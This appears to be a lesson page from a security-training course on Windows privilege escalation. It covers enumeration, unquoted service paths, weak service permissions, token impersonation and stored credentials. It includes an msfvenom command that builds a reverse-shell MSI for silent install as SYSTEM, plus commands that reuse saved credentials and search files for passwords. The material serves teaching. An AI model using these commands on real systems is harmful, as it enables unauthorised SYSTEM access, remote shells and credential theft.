---
title: "Windows Privilege Escalation"
topic: "windows-privilege-escalation"
tags: [windows, privilege-escalation, token-impersonation, unquoted-path, services, registry]
difficulty: advanced
day: 45
layout: default
parent: Topics
nav_order: 45
---

# Windows Privilege Escalation

## What You Will Learn
- Common Windows privilege escalation techniques
- How to enumerate a Windows system for weaknesses
- How unquoted service paths, token impersonation, and registry permissions work
- Tools that automate Windows privilege escalation enumeration

## What Is It?

Windows privilege escalation is the process of going from a limited account to a higher-privilege account — typically from a standard user to Administrator, or from Administrator to SYSTEM.

After you gain initial access to a Windows machine, privilege escalation is usually your next goal.

## Why It Matters

Most initial access gives you a limited shell. To install tools, access sensitive files, or pivot further in the network, you need SYSTEM or Administrator privileges.

## Key Concepts

### Enumeration First

Always enumerate before exploiting. Gather information about the system:

```powershell
# System information
systeminfo

# Current user and privileges
whoami /all

# Local users and groups
net users
net localgroup administrators

# Installed software
wmic product get name,version

# Running services
wmic service list brief
net start

# Scheduled tasks
schtasks /query /fo LIST /v

# Network connections
netstat -ano
```

### Automated Enumeration Tools

```powershell
# PowerUp — finds common misconfigurations
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# WinPEAS — comprehensive enumeration script
.\winPEAS.exe
```

### Unquoted Service Paths

If a Windows service has a path with spaces and no quotes, Windows tries multiple paths to find the executable. An attacker can place a malicious binary in one of those paths.

```
C:\Program Files\My App\service.exe

Windows tries in order:
  C:\Program.exe
  C:\Program Files\My.exe
  C:\Program Files\My App\service.exe
```

```powershell
# Find unquoted service paths
wmic service get name,pathname,displayname,startmode | 
  findstr /i "auto" | findstr /i /v "c:\windows\\" | 
  findstr /i /v '\"'
```

### Weak Service Permissions

If you have write access to a service binary or its directory, you can replace it:

```powershell
# Check service permissions
sc qc <servicename>

# Check directory permissions
icacls "C:\path\to\service\"
```

### Token Impersonation

Windows tokens represent security credentials. If you have `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`, you can impersonate another user's token.

```powershell
# Check current privileges
whoami /priv

# Tools that exploit token impersonation
# JuicyPotato, PrintSpoofer, GodPotato
.\PrintSpoofer.exe -i -c cmd
```

### AlwaysInstallElevated

If both these registry keys are set to 1, any user can install MSI packages as SYSTEM:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi

# Install it (runs as SYSTEM)
msiexec /quiet /qn /i evil.msi
```

### Stored Credentials

```powershell
# List saved credentials
cmdkey /list

# Run a command as another user with saved credentials
runas /savecred /user:admin "cmd.exe"

# Search for passwords in common locations
findstr /si password *.txt *.xml *.ini
```

## Resources

- [HackTricks — Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [TryHackMe — Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc)
- [LOLBAS — Living Off the Land Binaries](https://lolbas-project.github.io/)
- [WinPEAS — Privilege Escalation Awesome Scripts](https://github.com/carlospolop/PEASS-ng)
- [PowerSploit / PowerUp](https://github.com/PowerShellMafia/PowerSploit)
